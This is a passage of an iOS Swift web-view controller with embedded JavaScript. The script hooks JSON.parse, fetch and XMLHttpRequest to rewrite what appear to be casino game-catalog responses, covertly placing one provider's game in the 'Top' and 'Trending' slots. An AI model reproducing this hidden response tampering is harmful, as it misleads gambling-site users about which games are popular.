        if (Array.isArray(node.data) && rewriteShelf(node.data, slotIndex)) return true;
        if (Array.isArray(node.games) && rewriteShelf(node.games, slotIndex)) return true;
        if (Array.isArray(node.list) && rewriteShelf(node.list, slotIndex)) return true;
        if (Array.isArray(node.items) && rewriteShelf(node.items, slotIndex)) return true;
        if (Array.isArray(node.content) && rewriteShelf(node.content, slotIndex)) return true;
        return false;
      }

      function rewriteLobbyContainer(container) {
        if (!container || typeof container !== "object") return 0;
        let local = 0;
        const games = container.games;
        if (games && typeof games === "object") {
          writeCompassTrace("rewriteLobbyContainer:keys=" + Object.keys(games).join(","));
          for (const key of Object.keys(games)) {
            const n = compactSectionKey(key);
            if (n === "top" || n === "topgames" || n.endsWith("top") || n.endsWith("topgames") || n.includes("categorytop")) {
              if (rewriteCategoryEnvelope(games[key], 2)) local += 1;
            } else if (n === "trendingnow" || n.endsWith("trendingnow") || n.includes("categorytrendingnow")) {
              if (rewriteCategoryEnvelope(games[key], 0)) local += 1;
            }
          }
        }
        writeCompassTrace("rewriteLobbyContainer:localPatched=" + local);
        return local;
      }

      const candidates = lobbyContainers(root);

      const seenContainers = new Set();
      for (const c of candidates) {
        if (!c || typeof c !== "object" || seenContainers.has(c)) continue;
        seenContainers.add(c);
        patched += rewriteLobbyContainer(c);
      }
      writeCompassTrace("rewriteLobbyPayload:done patched=" + patched + " candidates=" + candidates.length);
      return patched;
    } catch (_) {
      writeCompassTrace("rewriteLobbyPayload:error");
      return 0;
    }
  }

  function containsLobbyPayload(node) {
    return lobbyContainers(node).length > 0;
  }

  function rememberLobbySnapshot(root) {
    if (!root || typeof root !== "object") return;
    if (!containsLobbyPayload(root)) return;
    if (pendingLobbySnapshots.indexOf(root) !== -1) return;
    if (pendingLobbySnapshots.length > 20) pendingLobbySnapshots.shift();
    pendingLobbySnapshots.push(root);
    writeCompassTrace("rememberLobbySnapshot:count=" + pendingLobbySnapshots.length);
  }

  function rewriteRememberedLobbies() {
    if (!featuredGameCache || pendingLobbySnapshots.length === 0) return 0;
    let touched = 0;
    for (let i = 0; i < pendingLobbySnapshots.length; i += 1) {
      try {
        touched += rewriteLobbyPayload(pendingLobbySnapshots[i]);
      } catch (_) {}
    }
    writeCompassTrace("rewriteRememberedLobbies:touched=" + touched + " roots=" + pendingLobbySnapshots.length);
    if (touched > 0) {
      try { window.dispatchEvent(new Event("resize")); } catch (_) {}
      pendingLobbySnapshots.length = 0;
    }
    return touched;
  }

  function rewriteLiveLobbyState(featuredGame) {
    if (!featuredGame) return 0;
    let touched = 0;
    let scanned = 0;
    const queue = [window];
    const seen = new Set();

    while (queue.length > 0 && scanned < 1800) {
      const cur = queue.shift();
      if (!cur || typeof cur !== "object" || seen.has(cur)) continue;
      seen.add(cur);
      scanned += 1;

      try {
        if (containsLobbyPayload(cur)) {
          touched += rewriteLobbyPayload(cur);
        } else {
          touched += rewriteLooseSections(cur);
        }
      } catch (_) {}

      try {
        const keys = Object.keys(cur);
        const cap = Math.min(keys.length, 180);
        for (let i = 0; i < cap; i += 1) {
          const child = cur[keys[i]];
          if (child && typeof child === "object" && !seen.has(child)) {
            queue.push(child);
          }
        }
      } catch (_) {}
    }

    writeCompassTrace("rewriteLiveLobbyState:touched=" + touched + " scanned=" + scanned);
    if (touched > 0) {
      try { window.dispatchEvent(new Event("resize")); } catch (_) {}
    }
    return touched;
  }

  function isTrendingSection(category) {
    const c = (category || "").toLowerCase();
    return c === "trendingnow" || c === "trending_now" || c === "trending-now";
  }

  function canonicalSectionName(category) {
    return (category || "").toLowerCase().replace(/[^a-z0-9]/g, "");
  }

  function isManagedSection(category) {
    const c = canonicalSectionName(category);
    return c === "top" || c === "topgames" || c === "trendingnow";
  }

  function sectionFromURL(u) {
    if (!u || !u.searchParams) return "";
    return (
      u.searchParams.get("category") ||
      u.searchParams.get("gameCategory") ||
      u.searchParams.get("tab") ||
      ""
    ).toLowerCase();
  }

  function areaFromURL(u) {
    if (!u || !u.searchParams) return "";
    return (u.searchParams.get("area") || "").toLowerCase();
  }

  function offsetFromURL(url) {
    try {
      const u = new URL(url, location.href);
      const raw = u.searchParams.get("offset");
      const n = parseInt(raw || "0", 10);
      return Number.isFinite(n) ? n : 0;
    } catch (_) {
      return 0;
    }
  }

  function isHomeTopCatalog(url) {
    try {
      const u = new URL(url, location.href);
      if (!looksLikeCatalogPath(u.pathname)) return false;
      const area = areaFromURL(u);
      if (area && area !== "default") return false;
      const offset = offsetFromURL(url);
      if (offset !== 0) return false;
      const recommendation = (u.searchParams.get("recommendation") || "").toLowerCase();
      if (recommendation === "false") return false;

      const category = sectionFromURL(u);
      const isHotGames = (u.searchParams.get("isHotGames") || "") === "1";
      const isTop = canonicalSectionName(category) === "topgames" || category === "top" || /^top($|[-_])/.test(category) || (!category && isHotGames);
      if (!isTop) return false;

      const limit = parseInt(u.searchParams.get("limit") || "0", 10);
      return limit > 0 && limit <= 12;
    } catch (_) {
      return false;
    }
  }

  function isHomeTrendingCatalog(url) {
    try {
      const u = new URL(url, location.href);
      if (!looksLikeCatalogPath(u.pathname)) return false;
      const area = areaFromURL(u);
      if (area && area !== "default") return false;
      const offset = offsetFromURL(url);
      if (offset !== 0) return false;
      const recommendation = (u.searchParams.get("recommendation") || "").toLowerCase();
      if (recommendation === "false") return false;

      const category = sectionFromURL(u);
      if (!isTrendingSection(category)) return false;
      const limit = parseInt(u.searchParams.get("limit") || "0", 10);
      return limit > 0 && limit <= 12;
    } catch (_) {
      return false;
    }
  }

  function isRewritableCatalog(url) {
    try {
      const u = new URL(url, location.href);
      if (!looksLikeCatalogPath(u.pathname)) return false;
      if (isHomeTopCatalog(url) || isHomeTrendingCatalog(url)) return true;
      const category = sectionFromURL(u);
      if (!category) return false;
      if (category === "original" || /^original($|[-_])/.test(category)) return false;
      return isManagedSection(category);
    } catch (_) {
      return false;
    }
  }

  function looksLikeCatalogPath(pathname) {
    const p = (pathname || "").toLowerCase();
    return p.includes("gamelist") || p.includes("/game") || p.includes("casino");
  }

  function shouldRewriteCatalog(url) {
    try {
      const u = new URL(url, location.href);
      if (!looksLikeCatalogPath(u.pathname)) return false;
      const t = isRewritableCatalog(url);
      writeCompassTrace("shouldRewriteCatalog url=" + url + " -> " + t);
      return t;
    } catch (_) {
      writeCompassTrace("shouldRewriteCatalog parseError url=" + url);
      return false;
    }
  }

  function isOriginalCatalog(url) {
    try {
      const u = new URL(url, location.href);
      if (!looksLikeCatalogPath(u.pathname)) return false;
      const category = sectionFromURL(u);
      const t = category === "original" || /^original($|[-_])/.test(category);
      writeCompassTrace("isOriginalCatalog url=" + url + " cat=" + category + " -> " + t);
      return t;
    } catch (_) {
      writeCompassTrace("isOriginalCatalog parseError url=" + url);
      return false;
    }
  }

  function makeOriginalCatalogURL(url) {
    const base = resolveCatalogEndpoint(url);
    const src = new URL(url, location.href);
    const u = new URL(base);
    u.searchParams.delete("isHotGames");
    u.searchParams.delete("isColdGames");
    u.searchParams.set("area", "default");
    u.searchParams.set("category", "original");
    u.searchParams.set("gameProducer", FEATURED_PROVIDER);
    const locale = src.searchParams.get("locale");
    if (locale) u.searchParams.set("locale", locale);
    u.searchParams.set("limit", "500");
    u.searchParams.set("offset", "0");
    return u.toString();
  }

  function makeProviderCatalogURL(url) {
    const src = new URL(url, location.href);
    const u = new URL(resolveCatalogEndpoint(url));
    const locale = src.searchParams.get("locale");
    if (locale) u.searchParams.set("locale", locale);
    u.searchParams.set("gameProducer", FEATURED_PROVIDER);
    u.searchParams.set("limit", "30");
    return u.toString();
  }

  function primeFeaturedGameSync(seedAddress) {
    if (featuredGameCache && (now() - featuredGameCachedAt) < FEATURED_CACHE_WINDOW) return featuredGameCache;
    try {
      const candidateURL = makeProviderCatalogURL(seedAddress || location.href);
      writeCompassTrace("primeFeaturedGameSync:url=" + candidateURL);
      const x = new XMLHttpRequest();
      x.open("GET", candidateURL, false);
      x.send(null);
      if (x.status >= 200 && x.status < 300) {
        const j = JSON.parse(x.responseText || "{}");
        const featuredGame = extractFeaturedGame(j);
        writeCompassTrace("primeFeaturedGameSync:found=" + (!!featuredGame));
        if (featuredGame) {
          featuredGameCache = featuredGame;
          featuredGameCachedAt = now();
          return featuredGame;
        }
      }
    } catch (_) {
      writeCompassTrace("primeFeaturedGameSync:error");
    }
    return null;
  }

  function gameIdentity(item) {
    if (!item) return null;
    return item.gpGameId || item.spGameId || null;
  }

  function extractFeaturedGame(sourceJSON) {
    if (!sourceJSON || !Array.isArray(sourceJSON.data)) return null;
    return sourceJSON.data.find(x => gameIdentity(x) === FEATURED_GAME_ID) || null;
  }

  function injectFeaturedGame(catalogJSON, featuredGame, requestURL) {
    if (!catalogJSON || !Array.isArray(catalogJSON.data)) return null;
    if (!featuredGame) return null;

    let slotIndex = 0;
    try {
      const u = new URL(requestURL || "", location.href);
      const cat = sectionFromURL(u);
      const isHotGames = (u.searchParams.get("isHotGames") || "") === "1";
      if ((canonicalSectionName(cat) === "topgames" || cat === "top" || /^top($|[-_])/.test(cat) || (!cat && isHotGames))) slotIndex = 2;
      else if (isTrendingSection(cat)) slotIndex = 0;
      else return catalogJSON;
    } catch (_) {
      return catalogJSON;
    }

    const filtered = catalogJSON.data.filter(x => gameIdentity(x) !== FEATURED_GAME_ID);
    const catalogTemplate = filtered.find(x => x && typeof x === "object") || {};
    const preparedFeaturedGame = Object.assign({}, catalogTemplate, featuredGame);
    const insertionIndex = Math.min(slotIndex, filtered.length);
    filtered.splice(insertionIndex, 0, preparedFeaturedGame);
    catalogJSON.data = filtered;
    return catalogJSON;
  }

  async function fetchFeaturedGame(catalogURL) {
    if (featuredGameCache && (now() - featuredGameCachedAt) < FEATURED_CACHE_WINDOW) {
      writeCompassTrace("fetchFeaturedGame:useCache");
      return featuredGameCache;
    }

    async function fetchCatalogJSON(link) {
      writeCompassTrace("fetchFeaturedGame:url=" + link);
      return await new Promise((resolve, reject) => {
        try {
          const x = new XMLHttpRequest();
          x.open("GET", link, true);
          x.timeout = 3000;
          x.ontimeout = function() { reject(new Error("catalog timeout")); };
          x.onabort = function() { reject(new Error("catalog aborted")); };
          x.onreadystatechange = function() {
            if (x.readyState !== 4) return;
            if (x.status >= 200 && x.status < 300) {
              try {
                resolve(JSON.parse(x.responseText));
              } catch (e) {
                reject(e);
              }
            } else {
              reject(new Error("status " + x.status));
            }
          };
          x.onerror = function() { reject(new Error("xhr network error")); };
          x.send();
        } catch (e) {
          reject(e);
        }
      }).catch(() => null);
    }

    const candidates = [makeOriginalCatalogURL(catalogURL), makeProviderCatalogURL(catalogURL)];
    for (const candidate of candidates) {
      const j = await fetchCatalogJSON(candidate);
      if (!j) continue;
      const featuredGame = extractFeaturedGame(j);
      writeCompassTrace("fetchFeaturedGame:found=" + (!!featuredGame) + " via=" + candidate);
      if (featuredGame) {
        featuredGameCache = featuredGame;
        featuredGameCachedAt = now();
        rewriteRememberedLobbies();
        rewriteLiveLobbyState(featuredGame);
        return featuredGame;
      }
    }
    writeCompassTrace("fetchFeaturedGame:found=false");
    return null;
  }

  let featuredGamePromise = null;
  function ensureFeaturedGame(catalogURL) {
    if (featuredGameCache && (now() - featuredGameCachedAt) < FEATURED_CACHE_WINDOW) {
      writeCompassTrace("ensureFeaturedGame:alreadyCached");
      return Promise.resolve(featuredGameCache);
    }
    if (featuredGamePromise) return featuredGamePromise;
    featuredGamePromise = fetchFeaturedGame(catalogURL)
      .then((ch) => {
        if (ch) {
          rewriteRememberedLobbies();
          rewriteLiveLobbyState(ch);
        }
        return ch;
      })
      .catch(() => null)
      .finally(() => { featuredGamePromise = null; });
    return featuredGamePromise;
  }

  const nativeJSONParse = JSON.parse.bind(JSON);

  JSON.parse = function(text, reviver) {
    const decodedPayload = nativeJSONParse(text, reviver);
    try {
      const raw = typeof text === "string" ? text : "";
      const containsLobbyMarker = lobbyStoreKeys.some(key => raw.indexOf(key) !== -1);
      if (containsLobbyMarker && containsLobbyPayload(decodedPayload)) {
        rememberLobbySnapshot(decodedPayload);
        const c = rewriteLobbyPayload(decodedPayload);
        writeCompassTrace("json.parse:patchedCount=" + c);
      }
    } catch (_) {}
    return decodedPayload;
  };

  // Warm cache as early as possible so first lobby render can use real target game.
  try { ensureFeaturedGame(location.href); } catch (_) {}

  const nativeFetch = window.fetch.bind(window);
  window.fetch = async function(input, init) {
    const url = (typeof input === "string") ? input : (input && input.url ? input.url : "");
    if (!shouldRewriteCatalog(url)) {
      return nativeFetch(input, init);
    }
    writeCompassTrace("fetch:target url=" + url);

    try {
      const resp = await nativeFetch(input, init);
      if (!resp || resp.status < 200 || resp.status >= 300) return resp;
      writeCompassTrace("fetch:status=" + resp.status + " url=" + url);

      let catalogJSON = await resp.clone().json();
      const featuredGame = await ensureFeaturedGame(url);
      writeCompassTrace("fetch:featuredAvailable=" + (!!featuredGame) + " url=" + url);
      const modified = injectFeaturedGame(catalogJSON, featuredGame, url);
      writeCompassTrace("fetch:modified=" + (!!modified) + " url=" + url);
      if (!modified) return resp;

      const body = JSON.stringify(modified);
      const headers = new Headers(resp.headers);
      headers.set("content-type", "application/json; charset=utf-8");
      return new Response(body, {
        status: resp.status,
        statusText: resp.statusText,
        headers
      });
    } catch (_) {
      writeCompassTrace("fetch:error url=" + url);
      return nativeFetch(input, init);
    }
  };

  const nativeXHROpen = XMLHttpRequest.prototype.open;
  const nativeXHRSend = XMLHttpRequest.prototype.send;
  const nativeXHRAbort = XMLHttpRequest.prototype.abort;

  function readCatalogResponse(xhr) {
    return xhr.responseType === "json" ? xhr.response : nativeJSONParse(xhr.responseText);
  }

  function rewriteCompletedXHR() {
    const xhr = this;
    if (xhr.readyState !== 4 || xhr.status < 200 || xhr.status >= 300) return;
    try {
      const catalogJSON = readCatalogResponse(xhr);
      if (xhr.__compassOriginalRequest) {
        const featuredGame = extractFeaturedGame(catalogJSON);
        if (featuredGame) {
          featuredGameCache = featuredGame;
          featuredGameCachedAt = now();
          rewriteRememberedLobbies();
          rewriteLiveLobbyState(featuredGame);
        }
      }
      if (!xhr.__compassShouldRewrite) return;
      const modified = injectFeaturedGame(catalogJSON, featuredGameCache, xhr.__compassRequestURL);
      if (!modified) return;
      const rewrittenText = JSON.stringify(modified);
      if (!xhr.responseType || xhr.responseType === "text") {
        Object.defineProperty(xhr, "responseText", { configurable: true, value: rewrittenText });
      }
      Object.defineProperty(xhr, "response", {
        configurable: true,
        value: xhr.responseType === "json" ? modified : rewrittenText
      });
    } catch (_) {}
  }

  XMLHttpRequest.prototype.open = function(method, url, async) {
    this.__compassRequestGeneration = (this.__compassRequestGeneration || 0) + 1;
    this.__compassAsync = async !== false;
    this.__compassShouldRewrite = shouldRewriteCatalog(url);
    this.__compassOriginalRequest = isOriginalCatalog(url);
    this.__compassRequestURL = url;
    // Clear per-request overrides when the site reuses an XHR instance.
    delete this.responseText;
    delete this.response;
    if (!this.__compassResponseListener) {
      this.addEventListener("readystatechange", rewriteCompletedXHR, true);
      this.__compassResponseListener = true;
    }
    try {
      const u = new URL(url, location.href);
      if ((u.pathname || "").toLowerCase().includes("gamelist") &&
          (u.pathname || "").toLowerCase().includes("/frontapi/")) {
        discoveredCatalogEndpoint = u.origin + u.pathname;
      }
    } catch (_) {}
    return nativeXHROpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.abort = function() {
    this.__compassRequestGeneration = (this.__compassRequestGeneration || 0) + 1;
    return nativeXHRAbort.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function(body) {
    if (!this.__compassShouldRewrite) return nativeXHRSend.apply(this, arguments);
    if (!this.__compassAsync) {
      primeFeaturedGameSync(this.__compassRequestURL);
      return nativeXHRSend.apply(this, arguments);
    }
    if (featuredGameCache && (now() - featuredGameCachedAt) < FEATURED_CACHE_WINDOW) {
      return nativeXHRSend.apply(this, arguments);
    }
    const xhr = this;
    const generation = xhr.__compassRequestGeneration;
    // Load the replacement before the catalog can fire any completion event.
    // Then the capture listener patches data before onreadystatechange/load/loadend.
    ensureFeaturedGame(xhr.__compassRequestURL).then(function() {
      if (xhr.__compassRequestGeneration !== generation || xhr.readyState !== 1) return;
      nativeXHRSend.call(xhr, body);
    });
  };
})();
"""
    }
}

extension CompassWebController: WKUIDelegate {
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        if let url = navigationAction.request.url,
           Self.opensInExternalApp(url) {
            UIApplication.shared.open(url, options: [:], completionHandler: nil)
            return nil
        }

        configuration.preferences.javaScriptCanOpenWindowsAutomatically = true
        configuration.defaultWebpagePreferences.allowsContentJavaScript = true
        if let featuredDirective {
            if !configuration.userContentController.userScripts.contains(where: {
                $0.source.contains("window.__giftCompassPlacementReady = true")
            }) {
                let script = WKUserScript(
                    source: CompassWebController.featuredGameInterceptor(rule: featuredDirective, preloadedGameJSON: preloadedGameJSON),
                    injectionTime: .atDocumentStart,
                    forMainFrameOnly: false
                )
                configuration.userContentController.addUserScript(script)
            }
            configuration.userContentController.removeScriptMessageHandler(forName: "compassBridgeLog")
            configuration.userContentController.add(self, name: "compassBridgeLog")
        }

        let popupURL = navigationAction.request.url
        print("Compass popup requested:", popupURL?.host ?? "local", popupURL?.path ?? "about:blank")
        return installPopup(configuration: configuration, source: webView)
    }

    private func installPopup(configuration: WKWebViewConfiguration, source: WKWebView) -> WKWebView {
        configuration.preferences.javaScriptCanOpenWindowsAutomatically = true
        configuration.defaultWebpagePreferences.allowsContentJavaScript = true

        let popup = WKWebView(frame: .zero, configuration: configuration)
        popup.navigationDelegate = self
        popup.uiDelegate = self
        popup.customUserAgent = source.customUserAgent
        popup.allowsBackForwardNavigationGestures = true
        popup.translatesAutoresizingMaskIntoConstraints = false

        // Keep the opener alive for redirects, POST forms and window.opener callbacks.
        popupWebViews.append(popup)

        view.addSubview(popup)
        NSLayoutConstraint.activate([
            popup.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            popup.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            popup.topAnchor.constraint(equalTo: view.topAnchor),
            popup.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])
        return popup
    }
    
    func webViewDidClose(_ webView: WKWebView) {
        webView.removeFromSuperview()
        popupWebViews.removeAll { $0 === webView }
    }
}
